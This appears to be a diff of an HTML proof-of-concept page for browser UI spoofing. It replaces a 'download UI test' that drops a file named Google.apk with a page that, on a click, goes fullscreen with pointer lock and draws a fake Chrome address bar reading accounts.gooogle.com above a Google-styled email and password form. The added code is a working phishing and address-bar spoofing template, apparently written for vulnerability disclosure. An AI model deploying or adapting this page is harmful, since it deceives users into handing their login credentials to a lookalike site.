@@ -1,141 +1,46 @@
+<html onclick=main()>
+<center>
+<h1> Click to login <h1>
+<script>
+    function main() {
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chrome Android Download UI Test</title>
+pointerLockElement.requestPointerLock();
+            fullscreenElement.appendChild(pointerLockElement)
 
-  <style>
-    * {
-      box-sizing: border-box;
+        fullscreenElement.requestFullscreen();
+		
+var div = document.getElementById('pointerLockElement');
+
+div.innerHTML = `
+    <div style="width: 100%; background-color: #ffffff; padding: 8px 12px; display: flex; align-items: center; border-bottom: 1px solid #e0e0e0; box-sizing: border-box; height: 56px;">
+        <div style="margin-right: 12px; display: flex; align-items: center;">
+            <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #5f6368;">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+        </div>
+        <div style="background-color: #f1f3f4; width: 100%; padding: 8px 12px; border-radius: 20px; font-size: 14px; color: #202124; display: flex; align-items: center; box-sizing: border-box;">
+            <span style="color: #137333; font-weight: bold; margin-right: 4px;">https://</span>accounts.gooogle.com
+        </div>
+    </div>
+    <center style="font-family: sans-serif; padding-top: 40px;">
+        <h2 style="font-size: 26px; color: #202124; margin-bottom: 20px;">PoC by FARISSAL B</h2>
+        <input type="email" placeholder="Email atau Ponsel" style="width: 80%; padding: 12px; margin-bottom: 15px; border: 1px solid #757575; border-radius: 4px; box-sizing: border-box; font-size: 16px;"><br>
+        <input type="password" placeholder="Masukkan Sandi" style="width: 80%; padding: 12px; margin-bottom: 20px; border: 1px solid #757575; border-radius: 4px; box-sizing: border-box; font-size: 16px;"><br>
+        <button style="width: 80%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold;">Next</button>
+    </center>
+`;
+
     }
+</script>
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 24px;
-      font-family: Arial, sans-serif;
-      background: #f4f6f8;
-      color: #202124;
-      text-align: center;
-    }
 
-    .container {
-      width: 100%;
-      max-width: 420px;
-      padding: 28px 22px;
-      background: #ffffff;
-      border-radius: 14px;
-      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08);
-    }
+<div id="pointerLockElement" style="background-color:white;"> 
 
-    h1 {
-      font-size: 23px;
-      margin-top: 0;
-    }
 
-    p {
-      font-size: 15px;
-      line-height: 1.6;
-      color: #5f6368;
-    }
 
-    button {
-      width: 100%;
-      margin-top: 16px;
-      padding: 14px 20px;
-      border: none;
-      border-radius: 8px;
-      background: #1a73e8;
-      color: white;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-    }
+ </div>
 
-    button:active {
-      background: #1558b0;
-    }
+<div id="fullscreenElement" style="background-color:white;">
+</div>
 
-    #status {
-      margin-top: 18px;
-      overflow-wrap: anywhere;
-    }
-
-    .notice {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #777;
-    }
-  </style>
-</head>
-
-<body>
-  <main class="container">
-    <h1>Download UI Test</h1>
-
-    <p>
-      This proof of concept tests how Chrome for Android
-      handles a new tab and a download initiated by one click.
-    </p>
-
-    <button id="runTest">
-      Open Google and Start Download
-    </button>
-
-    <p id="status" role="status">
-      Ready to run the test.
-    </p>
-
-    <p class="notice">
-      This is a harmless UI test. The downloaded file contains
-      plain text and is not a valid Android application.
-    </p>
-  </main>
-
-  <script>
-    document.getElementById("runTest").addEventListener("click", () => {
-      // Open the real Google website in a new tab.
-      const newTab = window.open("https://google.com", "_blank");
-
-      // Create a harmless text payload, not an installable APK.
-      const content = [
-        "Chrome Android Download UI Test",
-        "",
-        "This file is a harmless proof-of-concept artifact.",
-        "It is not an Android application."
-      ].join("\n");
-
-      const blob = new Blob(
-        [content],
-        { type: "application/octet-stream" }
-      );
-
-      const objectUrl = URL.createObjectURL(blob);
-      const link = document.createElement("a");
-
-      link.href = objectUrl;
-      link.download = "Google.apk";
-
-      document.body.appendChild(link);
-      link.click();
-      link.remove();
-
-      document.getElementById("status").textContent =
-        newTab
-          ? "Google was opened in a new tab and the download was requested."
-          : "The new tab may have been blocked. The download was requested.";
-
-      // Release the temporary object URL.
-      setTimeout(() => {
-        URL.revokeObjectURL(objectUrl);
-      }, 10000);
-    });
-  </script>
-</body>
 </html>
